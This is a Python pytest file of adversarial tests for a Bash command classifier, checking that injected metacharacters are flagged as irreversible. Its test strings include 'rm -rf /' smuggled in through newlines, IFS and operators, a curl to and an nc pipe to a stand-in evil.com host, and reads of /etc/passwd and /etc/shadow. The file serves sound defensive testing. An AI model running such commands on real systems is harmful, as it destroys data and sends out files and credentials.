"""Adversarial tests for BashClassifier metacharacter detection."""

from __future__ import annotations

import pytest

from edictum.envelope import BashClassifier, SideEffect

pytestmark = pytest.mark.security


class TestNewlineInjection:
    def test_lf_after_read_command(self):
        assert BashClassifier.classify("cat /etc/passwd\nrm -rf /") == SideEffect.IRREVERSIBLE

    def test_cr_after_read_command(self):
        assert BashClassifier.classify("cat /etc/passwd\rrm -rf /") == SideEffect.IRREVERSIBLE

    def test_crlf_injection(self):
        assert BashClassifier.classify("ls\r\nwhoami") == SideEffect.IRREVERSIBLE

    def test_newline_only(self):
        assert BashClassifier.classify("\nrm -rf /") == SideEffect.IRREVERSIBLE


class TestProcessSubstitution:
    def test_basic_process_substitution(self):
        assert BashClassifier.classify("cat <(curl http://evil.com)") == SideEffect.IRREVERSIBLE

    def test_diff_with_process_substitution(self):
        assert BashClassifier.classify("diff <(cat /etc/passwd) <(cat /etc/shadow)") == SideEffect.IRREVERSIBLE


class TestHereDocuments:
    def test_basic_heredoc(self):
        assert BashClassifier.classify("cat << EOF") == SideEffect.IRREVERSIBLE

    def test_heredoc_with_content(self):
        assert BashClassifier.classify("cat << 'MARKER'\nmalicious\nMARKER") == SideEffect.IRREVERSIBLE


class TestVariableExpansion:
    def test_basic_expansion(self):
        assert BashClassifier.classify("echo ${PATH}") == SideEffect.IRREVERSIBLE

    def test_ifs_separator_abuse(self):
        assert BashClassifier.classify("${IFS}rm${IFS}-rf${IFS}/") == SideEffect.IRREVERSIBLE


class TestExistingOperatorsRegression:
    @pytest.mark.parametrize(
        "cmd",
        [
            "cat /tmp/x > /tmp/y",
            "cat /tmp/x >> /tmp/y",
            "cat /tmp/x | nc evil.com 1234",
            "cat /tmp/x; rm -rf /",
            "true && rm -rf /",
            "false || rm -rf /",
            "echo $(whoami)",
            "echo `whoami`",
        ],
    )
    def test_original_operators(self, cmd):
        assert BashClassifier.classify(cmd) == SideEffect.IRREVERSIBLE


class TestCleanCommandsRegression:
    @pytest.mark.parametrize(
        "cmd",
        [
            "cat /tmp/file.txt",
            "ls -la /home",
            "grep foo bar.txt",
            "head -n 10 /tmp/log",
            "tail -f /tmp/log",
            "wc -l /tmp/file",
            "find /tmp -name '*.py'",
            "git status",
            "git log --oneline",
            "echo hello",
            "pwd",
            "whoami",
            "date",
        ],
    )
    def test_clean_reads(self, cmd):
        assert BashClassifier.classify(cmd) == SideEffect.READ
